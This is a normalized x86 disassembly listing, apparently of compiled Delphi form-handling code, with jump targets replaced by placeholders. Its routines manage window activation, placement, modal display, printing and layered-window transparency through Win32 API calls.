call [ edx + 0xc0 ]
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_479ce0
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49b5a0
mov eax [ ebp - 0x4 ]
and [ eax + 0x384 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_479ce0
call sub_494028
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ShowWindow
jmp r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_479ce0
call sub_494358
mov ebx eax
sub_49b5ec
push ebx
mov ebx eax
mov eax ebx
call sub_47b978
cmp [ ebx + 0x29e ] 0x1
jne r-xdata
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x37c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x37c ]
push eax
call __imp_SendMessageW
sub_49b648
push esi
mov esi eax
cmp [ esi + 0x5b ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x3c ]
mov eax [ esi + 0x64 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
call sub_470f84
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x64 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_49b680
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffa4
call sub_40587c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_49b6b8
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x384 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x108 ]
test al al
je r-xdata
mov [ ebx + 0x2b8 ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x29e ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x298 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_4a08fc
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffad
call sub_40587c
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_49bba0
jmp r-xdata
mov eax ebx
call sub_49bc7c
mov dl 0x1
mov eax ebx
call sub_4986e4
jmp r-xdata
sub_49b75c
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x29e ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x2fa ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_497e6c
mov esi eax
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x2fc ]
call [ ebx + 0x2f8 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_497eb8
mov edx [ eax ]
call [ edx + 0x108 ]
test al al
je r-xdata
sub_49b7c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_49b82d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x108 ]
test al al
je r-xdata
movzx eax [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_40587c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2b8 ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_49bc7c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_49b858
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_405d1c#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47074c
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax ebx
call sub_47078c
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_451144
mov edx [ ebx + 0x1c0 ]
call sub_44de34
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_451144
pop edx
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp - 0x4 ]
call sub_451144
call sub_44cf34
xor eax eax
push ebp
push sub_49b93d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xfffffff0
mov eax ebx
call sub_479ce0
push eax
call GetWindowLongW
test eax 0x800000
je r-xdata
xor esi esi
or esi 0xffffffff
jmp r-xdata
push esi
mov eax [ ebp - 0x4 ]
call sub_451144
call sub_44df24
mov edx eax
mov ecx esi
mov eax ebx
call sub_477644
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49b944
mov eax [ ebp - 0x4 ]
call sub_451144
call sub_44d038
retn
sub_49b944
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49b970
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
call sub_4571e4
call sub_456514
xor edx edx
push ebp
push sub_49bb8f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_49b858
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_497fd8
call sub_44cf34
xor edx edx
push ebp
push sub_49bb70
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_4571e4
mov ebx eax
mov eax ebx
call sub_4568c4
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov esi eax
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax esi
call sub_44f190
mov eax [ ebp - 0xc ]
call sub_4041ec
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_49bb46
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x10 ]
call sub_4041ec
mov [ ebp - 0x20 ] eax
xor edx edx
push ebp
push sub_49bb26
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x1c ]
xor edx edx
mov eax esi
call sub_44f24c
mov eax [ ebp - 0x1c ]
mov esi [ eax + 0x4 ]
mov edi [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x2a3 ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_49847c
push eax
push 0x58
mov eax [ ebp - 0x24 ]
call sub_44df24
push eax
call GetDeviceCaps
push eax
push esi
call MulDiv
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
call sub_49847c
push eax
push 0x5a
mov eax [ ebp - 0x24 ]
call sub_44df24
push eax
call GetDeviceCaps
push eax
push edi
call MulDiv
mov [ ebp - 0x18 ] eax
jmp r-xdata
dec al
je r-xdata
push 0xcc0020
push 0x0
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x20 ]
push eax
push edi
push esi
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4568c4
call sub_44df24
push eax
call StretchDIBits
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49bb2d
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x20 ]
call sub_404220
retn
push edi
mov eax ebx
call sub_456bb0
push eax
push esi
call MulDiv
mov [ ebp - 0x14 ] eax
mov eax ebx
call sub_456bcc
cmp eax [ ebp - 0x14 ]
jle r-xdata
jmp r-xdata
mov eax ebx
call sub_456bcc
mov [ ebp - 0x14 ] eax
push esi
mov eax ebx
call sub_456bcc
push eax
push edi
call MulDiv
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax ebx
call sub_456bb0
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] edi
sub_49bbc0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_49bc3f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x29d ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49bc46
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp [ ebx + 0x59 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
mov eax ebx
call sub_47a060
test al al
jne r-xdata
mov eax ebx
call sub_499ac8
sub_49bc4c
push ebx
mov ebx eax
mov [ ebx + 0x35c ] edx
xor eax eax
mov [ ebx + 0x358 ] eax
mov eax ebx
call sub_47a060
test al al
je r-xdata
mov eax ebx
call sub_4763e8
pop ebx
retn
mov eax ebx
call sub_4761e4
pop ebx
retn
sub_49bc98
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_49bfc2
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_46f128
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x59 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_49efe4
xor ecx ecx
push ebp
push sub_49bfa5
push [ fs : ecx ]
mov [ fs : ecx ] esp
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x384 ] 0x8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x348 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call __imp_SendMessageW
mov eax [ ebp - 0x4 ]
test [ eax + 0x384 ] 0x8
jne r-xdata
call sub_49404c
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x74 ]
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
xor edx edx
call sub_430658
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x74 ] edx
mov eax [ rw-data ]
movzx eax [ eax + 0x48 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_49daf0
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_4941f8
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_49bf83
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_49bba8
xor edx edx
push ebp
push sub_49bec4
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call SendMessageW
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2b8 ] edx
mov eax [ rw-data ]
cmp [ eax + 0xd0 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2b8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2b8 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4761e4
mov eax [ ebp - 0x4 ]
call sub_479cbc
cmp [ ebp - 0x1c ] 0x0
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_49b7c0
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
push eax
call IsWindow
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_4a0570
mov eax [ rw-data ]
cmp [ eax + 0xa4 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call SendMessageW
mov eax [ ebp - 0x4 ]
call sub_479ce0
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49becb
mov eax [ ebp - 0x4 ]
call sub_49bba0
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_49becb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49bf8d
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_49daf0
movzx edx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_49daf0
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x74 ] edx
xor edx edx
call sub_4305a0
mov ecx [ rw-data ]
mov edx eax
mov [ ecx + 0x74 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
xor ecx ecx
call sub_4307b0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4942bc
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
call IsWindow
test eax eax
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_494054
mov eax [ ebp - 0x4 ]
and [ eax + 0x384 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
xor eax eax
call sub_494358
mov [ ebp - 0x1c ] eax
sub_49bfd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
cmp [ edi + 0x1ea ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax edi
call sub_475884
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
call sub_475884
test eax eax
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8c ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_475848
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_49bfd4
pop ecx
sub_49c058
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1ea ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8c ]
mov esi [ ebx + 0x2b4 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_49bfd4
pop ecx
mov eax [ esi + 0x38 ]
call sub_45efdc
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebx + 0x2b4 ]
mov eax [ eax + 0x38 ]
mov edx edi
call sub_45efec
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_49c0c4
push ebx
add esp 0xffffffd4
mov ebx eax
mov eax ebx
call sub_47a060
test al al
je r-xdata
add esp 0x2c
pop ebx
retn
mov [ esp ] 0x2c
push esp
mov eax ebx
call sub_479ce0
push eax
call GetWindowPlacement
mov eax [ esp + 0x8 ]
sub eax 0x2
je r-xdata
mov [ ebx + 0x29a ] 0x1
jmp r-xdata
dec eax
je r-xdata
mov [ ebx + 0x29a ] 0x2
jmp r-xdata
jmp r-xdata
mov [ ebx + 0x29a ] 0x0
sub_49c138
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_477b5c
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x68 ]
sub_49c158
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_40587c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_49c188
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ea ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_475884
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_49c158
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_475884
test eax eax
jle r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_475848
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_49c188
pop ecx
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_49c210
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1ea ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x290 ]
call sub_49c158
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_49c158
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_49c188
pop ecx
test al al
je r-xdata
sub_49c268
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
sub_49c290
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
cmp [ edi + 0x1ea ] 0x0
je r-xdata
xor eax eax
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax edi
call sub_475884
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_49c268
pop ecx
test al al
jne r-xdata
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
call sub_475884
test eax eax
jle r-xdata
mov al 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_475848
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_49c290
pop ecx
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_49c320
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1ea ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x290 ]
call sub_49c268
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_49c268
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_49c290
pop ecx
test al al
je r-xdata
sub_49c378
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_43caf8
mov esi eax
dec esi
test esi esi
jl r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc esi
xor edi edi
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_49c378
pop ecx
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax ebx
call sub_48c560
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43cacc
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
sub_49c3f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x0
cmp [ ebx + 0x322 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
mov al 0x1
mov edi [ ebx + 0x2b4 ]
test edi edi
je r-xdata
push ebp
mov eax ebx
call sub_49c378
pop ecx
test al al
jne r-xdata
cmp [ edi + 0x3c ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffef
call sub_40587c
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49c46c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x2bc ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_43cd20
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x2bc ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_49c4a8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x294 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4713f4
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_472314
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_49c4f0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_47a060
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_479ce0
push eax
call GetWindowLongW
mov esi eax
cmp [ ebx + 0x340 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x368 ] 0x0
je r-xdata
movzx eax [ ebx + 0x340 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x368 ]
or eax [ edx * 4 + rw-data ]
push eax
movzx eax [ ebx + 0x341 ]
push eax
mov eax [ ebx + 0x36c ]
call sub_44bb2c
push eax
mov eax ebx
call sub_479ce0
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_479ce0
push eax
call SetWindowLongW
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_479ce0
push eax
call SetWindowLongW
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_479ce0
push eax
call RedrawWindow
sub_49c608
push ebx
mov ebx eax
cmp dl [ ebx + 0x368 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x368 ] dl
cmp [ ebx + 0x368 ] 0x0
je r-xdata
mov eax ebx
call sub_49c4f0
mov eax [ ebx + 0x374 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebx + 0x374 ]
call sub_4a2718
sub_49c670
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax esi
call sub_496864
mov edi eax
mov eax esi
call sub_496884
mov ebp eax
mov eax ebx
call sub_49d090
push eax
mov eax ebx
call sub_49d0dc
pop edx
add edx eax
push edx
mov eax esi
call sub_496864
add eax [ esi + 0x48 ]
pop edx
cmp edx eax
jge r-xdata
mov eax esi
call sub_497f38
mov ebx eax
mov eax esi
call sub_496864
push eax
mov eax ebx
call sub_49d090
pop edx
cmp edx eax
jge r-xdata
mov eax ebx
call sub_49d090
mov edi eax
mov eax ebx
call sub_49d0dc
add edi eax
sub edi [ esi + 0x48 ]
mov eax ebx
call sub_49d0c4
push eax
mov eax ebx
call sub_49d0a8
pop edx
add edx eax
push edx
mov eax esi
call sub_496884
add eax [ esi + 0x4c ]
pop edx
cmp edx eax
jge r-xdata
mov eax ebx
call sub_49d090
mov edi eax
mov eax esi
call sub_496884
push eax
mov eax ebx
call sub_49d0c4
pop edx
cmp edx eax
jge r-xdata
mov eax ebx
call sub_49d0c4
mov ebp eax
mov eax ebx
call sub_49d0a8
add ebp eax
sub ebp [ esi + 0x4c ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x98 ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_49d0c4
mov ebp eax
sub_49c75c
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_470438
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov ecx [ eax + 0x18 ]
and ecx 0xffff
shl edx 0x10
or ecx edx
mov [ eax + 0x18 ] ecx
test [ eax + 0x1c ] 0x1
jne r-xdata
retn
cmp [ eax + 0x29f ] 0x3
je r-xdata
xor edx edx
call sub_498514
retn
sub_49c798
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_47046c
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov ecx [ eax + 0x18 ]
and ecx 0xffff0000
and edx 0xffff
or ecx edx
mov [ eax + 0x18 ] ecx
test [ eax + 0x1c ] 0x1
jne r-xdata
retn
cmp [ eax + 0x29f ] 0x3
je r-xdata
xor edx edx
call sub_498514
retn
sub_49c7e4
push esi
add esp 0xfffffff0
mov esi eax
call sub_4406d0
test al al
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x54 ]
mov [ esi + 0x54 ] eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
call sub_47a060
test al al
je r-xdata
add esp 0x10
pop esi
retn
push 0xffffffff
push 0x0
mov eax esi
call sub_479ce0
push eax
call __imp_InvalidateRect
mov eax [ esi + 0x374 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x54 ]
mov [ esi + 0x54 ] eax
mov eax esp
xor ecx ecx
mov edx 0x10
call sub_404c14
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push esp
mov eax esi
